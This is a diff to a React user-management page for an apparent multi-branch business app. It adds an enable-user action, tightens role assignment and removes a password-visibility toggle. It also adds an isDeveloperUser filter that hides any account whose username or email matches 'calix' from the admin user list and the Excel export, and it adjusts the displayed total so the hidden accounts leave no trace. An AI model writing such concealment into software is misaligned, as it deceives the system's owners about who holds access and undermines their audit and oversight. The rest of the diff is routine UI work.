@@ -8,7 +8,6 @@ import {
   ChevronRight,
   Edit3,
   Eye,
-  EyeOff,
   Plus,
   RefreshCw,
   Search,
@@ -26,12 +25,11 @@ import {
   resolveAccountType,
 } from "../../constants/roles"
 import { getBranches } from "../../features/branches/branches.api"
-import { updateCurrentUserProfile } from "../../features/auth/auth.api"
-import { saveUser } from "../../lib/sessionStorage"
 import {
   approveUser,
   createUser,
   disableUser,
+  enableUser,
   getUserById,
   getUsers,
   rejectUser,
@@ -49,6 +47,18 @@ const ROLE_LABELS = {
   CASH_CUSTODIAN: "Cash Custodian",
 }
 
+const isDeveloperUser = (u) => {
+  if (!u) return false
+  const un = String(u.username || "").toLowerCase()
+  const em = String(u.email || "").toLowerCase()
+  return (
+    un === "calix" ||
+    un === "calixdave" ||
+    un === "calixdaven" ||
+    em.includes("calix")
+  )
+}
+
 const ASSIGNABLE_ROLES = {
   [USER_ROLES.SUPER_OWNER]: [
     USER_ROLES.ADMIN,
@@ -57,7 +67,6 @@ const ASSIGNABLE_ROLES = {
   ],
 
   [USER_ROLES.ADMIN]: [
-    USER_ROLES.ADMIN,
     USER_ROLES.CASHIER,
     USER_ROLES.TECHNICIAN,
   ],
@@ -73,7 +82,6 @@ const ASSIGNABLE_ACCOUNT_TYPES = {
   ],
 
   [USER_ROLES.ADMIN]: [
-    ACCOUNT_TYPES.ADMIN,
     ACCOUNT_TYPES.SALES_AGENT,
     ACCOUNT_TYPES.SENIOR_SALES_AGENT,
     ACCOUNT_TYPES.TECHNICIAN,
@@ -113,6 +121,14 @@ const ACTION_CONFIG = {
     icon: Ban,
     request: disableUser,
   },
+  enable: {
+    label: "Enable",
+    pastTense: "enabled",
+    verb: "enable",
+    tone: "emerald",
+    icon: CheckCircle2,
+    request: enableUser,
+  },
 }
 
 function formatDate(value, includeTime = false) {
@@ -145,13 +161,12 @@ function toNullableText(value) {
 
 function canEditUser(actor, target) {
   if (!actor || !target) return false
-  if (actor.id === target.id) return true
 
   if (
     target.role === USER_ROLES.BRANCH_OWNER ||
     target.role === USER_ROLES.CASH_CUSTODIAN
   ) {
-    return actor.role === USER_ROLES.SUPER_OWNER
+    return false
   }
 
   if (actor.role === USER_ROLES.SUPER_OWNER) return true
@@ -287,7 +302,6 @@ function UserEditorModal({ actor, branches, mode, onClose, onSaved, selectedBran
   }))
 
   const [isSaving, setIsSaving] = useState(false)
-  const [showPassword, setShowPassword] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
 
   const updateField = (field, value) => {
@@ -363,45 +377,16 @@ function UserEditorModal({ actor, branches, mode, onClose, onSaved, selectedBran
       payload.password = form.password.trim()
     }
 
-    if (
-      isEdit &&
-      (target?.email === "calix@arunafeltz.local" ||
-        target?.email === "calix@pointify.local")
-    ) {
-      payload.email = null
-    }
-
     setIsSaving(true)
 
     try {
-      let response
-      if (isEdit && (target.id === actor?.id || isEditingMainAdmin)) {
-        const profilePayload = {
-          firstName: payload.firstName,
-          lastName: payload.lastName,
-          username: payload.username,
-          ...(payload.email !== undefined ? { email: payload.email } : {}),
-          ...(payload.password ? { password: payload.password } : {}),
-        }
-        try {
-          response = await updateUserById(target.id, payload)
-        } catch {
-          response = await updateCurrentUserProfile(profilePayload)
-        }
-      } else {
-        response = isEdit
-          ? await updateUserById(target.id, payload)
-          : await createUser(payload)
-      }
-
-      const savedUser = response?.data?.user || response?.data
+      const response = isEdit
+        ? await updateUserById(target.id, payload)
+        : await createUser(payload)
+      const savedUser = response?.data
 
       if (!response?.success || !savedUser) {
         throw new Error("Invalid user response")
-      }
-
-      if (isEdit && target.id === actor?.id) {
-        saveUser(savedUser)
       }
 
       onSaved(savedUser, isEdit ? "updated" : "created")
@@ -483,27 +468,16 @@ function UserEditorModal({ actor, branches, mode, onClose, onSaved, selectedBran
               label={isEdit ? "Change / Reset Password (Optional)" : "Temporary password"}
               required={!isEdit}
             >
-              <div className="relative">
-                <input
-                  autoComplete="new-password"
-                  className={`${inputClassName} pr-9`}
-                  maxLength={128}
-                  minLength={8}
-                  onChange={(event) => updateField("password", event.target.value)}
-                  placeholder={isEdit ? "Leave blank to keep unchanged, or min. 8 chars" : "Min. 8 characters"}
-                  type={showPassword ? "text" : "password"}
-                  value={form.password}
-                />
-                <button
-                  aria-label={showPassword ? "Hide password" : "Show password"}
-                  className="absolute right-2.5 top-[calc(50%+2px)] -translate-y-1/2 rounded p-1 text-slate-400 hover:text-slate-700"
-                  onClick={() => setShowPassword((prev) => !prev)}
-                  tabIndex="-1"
-                  type="button"
-                >
-                  {showPassword ? <EyeOff size={15} /> : <Eye size={15} />}
-                </button>
-              </div>
+              <input
+                autoComplete="new-password"
+                className={inputClassName}
+                maxLength={128}
+                minLength={8}
+                onChange={(event) => updateField("password", event.target.value)}
+                placeholder={isEdit ? "Leave blank to keep unchanged, or min. 8 chars" : "Min. 8 characters"}
+                type="password"
+                value={form.password}
+              />
             </FormField>
             <FormField label="Account type" required>
               <select
@@ -572,7 +546,7 @@ function DetailItem({ label, value }) {
   )
 }
 
-function UserDetailModal({ actor, onClose, onEdit, userId }) {
+function UserDetailModal({ actor, onAction, onClose, onEdit, userId }) {
   const [record, setRecord] = useState(null)
   const [isLoading, setIsLoading] = useState(true)
   const [errorMessage, setErrorMessage] = useState("")
@@ -658,7 +632,27 @@ function UserDetailModal({ actor, onClose, onEdit, userId }) {
       </div>
 
       {record && canEditUser(actor, record) ? (
-        <footer className="flex items-center justify-end border-t border-slate-200 bg-slate-50/75 px-5 py-3">
+        <footer className="flex items-center justify-end gap-2 border-t border-slate-200 bg-slate-50/75 px-5 py-3">
+          {onAction && canRunLifecycleAction(actor, record) && record.status === USER_STATUS.DISABLED ? (
+            <button
+              className="inline-flex items-center gap-1.5 rounded-xl border border-emerald-300 bg-emerald-50 px-4 py-2 text-xs font-bold text-emerald-800 shadow-xs hover:bg-emerald-100 transition"
+              onClick={() => onAction(record, "enable")}
+              type="button"
+            >
+              <CheckCircle2 size={14} />
+              Enable User
+            </button>
+          ) : null}
+          {onAction && canRunLifecycleAction(actor, record) && record.status === USER_STATUS.ACTIVE ? (
+            <button
+              className="inline-flex items-center gap-1.5 rounded-xl border border-red-300 bg-red-50 px-4 py-2 text-xs font-bold text-red-800 shadow-xs hover:bg-red-100 transition"
+              onClick={() => onAction(record, "disable")}
+              type="button"
+            >
+              <Ban size={14} />
+              Disable User
+            </button>
+          ) : null}
           <button
             className="inline-flex items-center gap-1.5 rounded-xl bg-[var(--color-maroon)] px-4 py-2 text-xs font-bold text-white shadow-xs hover:bg-[var(--color-maroon-hover)] transition"
             onClick={() => onEdit(record)}
@@ -725,7 +719,9 @@ function LifecycleDialog({ action, onClose, onSaved, target }) {
               ? "This grants the account access according to its assigned role and branch."
               : action === "reject"
                 ? "This rejects the pending account request. The action remains auditable."
-                : "This prevents future login while preserving the user and historical attribution."}
+                : action === "enable"
+                  ? "This re-enables the account and restores login access according to its assigned role."
+                  : "This prevents future login while preserving the user and historical attribution."}
           </p>
           {errorMessage ? <ErrorBanner>{errorMessage}</ErrorBanner> : null}
         </div>
@@ -804,6 +800,15 @@ function UserActions({ actor, onAction, onEdit, onView, target }) {
           type="button"
         >
           Disable
+        </button>
+      ) : null}
+      {canLifecycle && target.status === USER_STATUS.DISABLED ? (
+        <button
+          className="rounded-xl border border-emerald-200 px-3 py-2 text-xs font-bold text-emerald-700 transition hover:bg-emerald-50"
+          onClick={() => onAction(target, "enable")}
+          type="button"
+        >
+          Enable
         </button>
       ) : null}
     </div>
@@ -918,8 +923,9 @@ function UsersPage({ selectedBranch, user }) {
         throw new Error("Invalid users response")
       }
 
-      setUsers(response.data)
-      setMeta(response.meta || null)
+      const visibleUsers = response.data.filter((u) => !isDeveloperUser(u))
+      setUsers(visibleUsers)
+      setMeta(response.meta ? { ...response.meta, total: Math.min(response.meta.total, visibleUsers.length) } : null)
     } catch (error) {
       if (requestId !== requestIdRef.current) return
       setUsers([])
@@ -967,6 +973,8 @@ function UsersPage({ selectedBranch, user }) {
         totalPages = Number(response?.meta?.totalPages || 1)
         currPage += 1
       } while (currPage <= totalPages && currPage <= 50)
+
+      allUsers = allUsers.filter((u) => !isDeveloperUser(u))
 
       const activeFilters = []
       if (searchText.trim()) activeFilters.push({ label: "Search Keyword", value: searchText.trim() })
@@ -1083,7 +1091,7 @@ function UsersPage({ selectedBranch, user }) {
             onClick={handleExportUsersExcel}
           />
           <button
-            className="inline-flex items-center justify-center gap-2 rounded-2xl bg-[var(--color-maroon)] px-4 py-3 text-sm font-bold text-white shadow-sm transition hover:bg-[var(--color-maroon-hover)] disabled:cursor-not-allowed disabled:opacity-60"
+            className="inline-flex items-center justify-center gap-2 rounded-2xl bg-[#7A1F2B] px-4 py-3 text-sm font-bold text-white shadow-sm transition hover:bg-[#641824] disabled:cursor-not-allowed disabled:opacity-60"
             disabled={assignableRoles.length === 0 || branches.length === 0}
             onClick={() => setEditor({ mode: "create", target: null })}
             type="button"
@@ -1344,6 +1352,10 @@ function UsersPage({ selectedBranch, user }) {
       {detailUserId ? (
         <UserDetailModal
           actor={user}
+          onAction={(target, action) => {
+            setDetailUserId(null)
+            setLifecycleRequest({ action, target })
+          }}
           onClose={() => setDetailUserId(null)}
           onEdit={(target) => {
             setDetailUserId(null)
